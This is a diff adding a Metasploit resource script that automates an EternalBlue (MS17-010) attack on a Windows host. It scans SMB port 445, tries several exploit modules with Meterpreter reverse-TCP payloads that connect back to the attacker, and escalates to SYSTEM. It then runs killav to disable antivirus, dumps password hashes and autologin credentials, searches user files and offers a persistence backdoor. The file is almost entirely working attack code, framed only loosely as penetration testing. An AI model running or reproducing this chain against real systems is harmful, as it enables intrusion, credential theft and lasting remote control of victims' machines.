@@ -1,0 +1,344 @@
+# ===============================================
+# EternalBlue (MS17-010) Comprehensive Exploitation
+# Includes scanning, exploitation, and post-exploitation
+# Author: Braxton
+# Usage: msfconsole -r eternalblue_master.rc
+# ===============================================
+
+<ruby>
+  print_line ""
+  print_line "=" * 60
+  print_line "  EternalBlue (MS17-010) Master Exploitation Script"
+  print_line "=" * 60
+  print_line ""
+  
+  # Prompt for target IP
+  print_status "Enter target IP address:"
+  target_ip = gets.chomp
+  
+  if target_ip.empty?
+    print_error "No target IP provided!"
+    exit
+  end
+  
+  framework.datastore['TARGET_IP'] = target_ip
+  print_good "Target set: #{target_ip}"
+  
+  # Get LHOST
+  eth0_output = `ip -br a show eth0 2>/dev/null`
+  if eth0_output.empty?
+    print_warning "Could not detect eth0. Enter your LHOST IP:"
+    lhost_ip = gets.chomp
+  else
+    lhost_ip = eth0_output.split[2].split('/')[0]
+  end
+  
+  framework.datastore['LHOST_IP'] = lhost_ip
+  print_good "LHOST set: #{lhost_ip}"
+  
+  print_line ""
+  print_line "-" * 60
+</ruby>
+
+# Set global variables
+setg RHOSTS %TARGET_IP%
+setg LHOST %LHOST_IP%
+setg VERBOSE true
+
+# ===============================================
+# PHASE 1: VULNERABILITY SCANNING
+# ===============================================
+
+print_line ""
+print_good "PHASE 1: Scanning for MS17-010 vulnerability"
+print_line "-" * 60
+
+# Check if target is up
+use auxiliary/scanner/portscan/tcp
+set PORTS 445
+set RHOSTS %TARGET_IP%
+set THREADS 1
+run
+
+print_line ""
+
+# SMB version detection
+print_status "Detecting SMB version..."
+use auxiliary/scanner/smb/smb_version
+set RHOSTS %TARGET_IP%
+run
+
+print_line ""
+
+# MS17-010 vulnerability check
+print_status "Checking for MS17-010 vulnerability..."
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS %TARGET_IP%
+run
+
+print_line ""
+print_warning "Review scan results above. If VULNERABLE, press ENTER to continue exploitation."
+print_warning "Otherwise, press Ctrl+C to abort."
+
+<ruby>
+  gets
+</ruby>
+
+# ===============================================
+# PHASE 2: EXPLOITATION - METHOD 1 (EternalBlue)
+# ===============================================
+
+print_line ""
+print_good "PHASE 2: Attempting EternalBlue exploitation (x64 payload)"
+print_line "-" * 60
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Target configuration
+set RHOSTS %TARGET_IP%
+set RPORT 445
+
+# x64 Meterpreter payload (most common)
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST %LHOST_IP%
+set LPORT 4444
+
+# Exploitation tuning
+set MaxExploitAttempts 10
+set GroomAllocations 13
+set GroomDelta 5000
+set ProcessName spoolsv.exe
+
+# Show configuration
+print_line ""
+show options
+print_line ""
+
+print_status "Launching EternalBlue exploit (x64)..."
+exploit -j -z
+
+# Wait for exploitation
+sleep 15
+
+# Check for sessions
+sessions -l
+
+<ruby>
+  if framework.sessions.length > 0
+    print_success "Exploitation successful! Session obtained."
+    print_line ""
+  else
+    print_warning "No session received. Trying alternative methods..."
+    print_line ""
+  end
+</ruby>
+
+# ===============================================
+# PHASE 2B: EXPLOITATION - ALTERNATIVE x86 PAYLOAD
+# ===============================================
+
+<ruby>
+  if framework.sessions.length == 0
+    print_line ""
+    print_good "Attempting alternative x86 payload..."
+    print_line "-" * 60
+  end
+</ruby>
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS %TARGET_IP%
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST %LHOST_IP%
+set LPORT 4445
+set MaxExploitAttempts 10
+exploit -j -z
+
+sleep 15
+sessions -l
+
+# ===============================================
+# PHASE 3: EXPLOITATION - METHOD 2 (PSExec)
+# ===============================================
+
+<ruby>
+  if framework.sessions.length == 0
+    print_line ""
+    print_good "PHASE 3: Attempting MS17-010 PSExec method"
+    print_line "-" * 60
+  end
+</ruby>
+
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS %TARGET_IP%
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST %LHOST_IP%
+set LPORT 4446
+set SHARE C$
+set SERVICE_NAME XblAuthManager
+exploit -j -z
+
+sleep 15
+sessions -l
+
+# ===============================================
+# PHASE 4: POST-EXPLOITATION
+# ===============================================
+
+<ruby>
+  if framework.sessions.length > 0
+    print_line ""
+    print_success "=" * 60
+    print_success "  EXPLOITATION SUCCESSFUL!"
+    print_success "=" * 60
+    print_line ""
+    
+    # Get the most recent session
+    session_id = framework.sessions.keys.sort.last
+    session = framework.sessions[session_id]
+    
+    print_good "Active session: #{session_id}"
+    print_line ""
+    print_status "Starting automated post-exploitation..."
+    print_line "-" * 60
+    
+    # Store session ID for commands
+    framework.datastore['SESSION_ID'] = session_id
+  else
+    print_error "=" * 60
+    print_error "  ALL EXPLOITATION ATTEMPTS FAILED"
+    print_error "=" * 60
+    print_line ""
+    print_warning "Possible reasons:"
+    print_warning "  1. Target is not vulnerable"
+    print_warning "  2. Target is patched"
+    print_warning "  3. Exploit parameters need adjustment"
+    print_warning "  4. Target architecture mismatch"
+    print_warning "  5. Network/firewall issues"
+    print_line ""
+    print_status "Manual troubleshooting steps:"
+    print_status "  • Try different GroomAllocations values (12-15)"
+    print_status "  • Ensure target SMB is not in use"
+    print_status "  • Check if firewall blocks reverse connections"
+    print_status "  • Try AutoBlue Python exploit as alternative"
+    print_line ""
+    exit
+  end
+</ruby>
+
+# Session interaction
+sessions -i %SESSION_ID% -c "sysinfo"
+
+print_line ""
+print_status "Checking current user privileges..."
+sessions -i %SESSION_ID% -c "getuid"
+
+print_line ""
+print_status "Attempting privilege escalation to SYSTEM..."
+sessions -i %SESSION_ID% -c "getsystem"
+
+print_line ""
+print_status "Verifying elevated privileges..."
+sessions -i %SESSION_ID% -c "getuid"
+
+print_line ""
+print_status "Gathering system information..."
+sessions -i %SESSION_ID% -c "sysinfo"
+
+print_line ""
+print_status "Getting process list..."
+sessions -i %SESSION_ID% -c "ps"
+
+print_line ""
+print_status "Checking for other users..."
+sessions -i %SESSION_ID% -c "run post/windows/gather/enum_logged_on_users"
+
+print_line ""
+print_status "Disabling Windows Defender (if possible)..."
+sessions -i %SESSION_ID% -c "run post/windows/manage/killav"
+
+print_line ""
+print_status "Dumping password hashes..."
+sessions -i %SESSION_ID% -c "hashdump"
+
+print_line ""
+print_status "Searching for interesting files..."
+sessions -i %SESSION_ID% -c "search -f *.txt -d C:\\Users"
+
+print_line ""
+print_status "Checking for credentials in registry..."
+sessions -i %SESSION_ID% -c "run post/windows/gather/credentials/windows_autologin"
+
+# ===============================================
+# PHASE 5: PERSISTENCE (Optional)
+# ===============================================
+
+print_line ""
+print_warning "=" * 60
+print_warning "  PERSISTENCE SETUP"
+print_warning "=" * 60
+print_line ""
+print_warning "Establish persistence? (y/n)"
+
+<ruby>
+  response = gets.chomp.downcase
+  if response == 'y' || response == 'yes'
+    framework.datastore['SETUP_PERSISTENCE'] = 'true'
+  else
+    framework.datastore['SETUP_PERSISTENCE'] = 'false'
+  end
+</ruby>
+
+<ruby>
+  if framework.datastore['SETUP_PERSISTENCE'] == 'true'
+    print_line ""
+    print_status "Setting up persistence mechanism..."
+  end
+</ruby>
+
+# Only run if persistence requested
+<ruby>
+  if framework.datastore['SETUP_PERSISTENCE'] == 'true'
+</ruby>
+    sessions -i %SESSION_ID% -c "run persistence -X -i 10 -p 4447 -r %LHOST_IP%"
+    print_line ""
+    print_good "Persistence handler will listen on port 4447"
+<ruby>
+  end
+</ruby>
+
+# ===============================================
+# FINAL SUMMARY
+# ===============================================
+
+print_line ""
+print_success "=" * 60
+print_success "  POST-EXPLOITATION COMPLETE"
+print_success "=" * 60
+print_line ""
+
+print_good "Session ID: %SESSION_ID%"
+print_good "Target: %TARGET_IP%"
+print_good "LHOST: %LHOST_IP%"
+print_line ""
+
+print_status "Useful commands:"
+print_line "  sessions -i %SESSION_ID%     - Interact with session"
+print_line "  sessions -l                  - List all sessions"
+print_line "  sessions -K                  - Kill all sessions"
+print_line "  help                         - Show meterpreter commands"
+print_line ""
+
+print_status "Recommended next steps:"
+print_line "  1. Migrate to stable process: migrate <PID>"
+print_line "  2. Screenshot desktop: screenshot"
+print_line "  3. Enable RDP: run post/windows/manage/enable_rdp"
+print_line "  4. Dump more credentials: run post/windows/gather/credentials/credential_collector"
+print_line "  5. Search for sensitive files: search -f *.kdbx"
+print_line "  6. Check network: ipconfig, route, arp"
+print_line ""
+
+print_warning "Remember to document everything for your report!"
+print_line ""
+
+# Keep session active
+sessions -i %SESSION_ID%
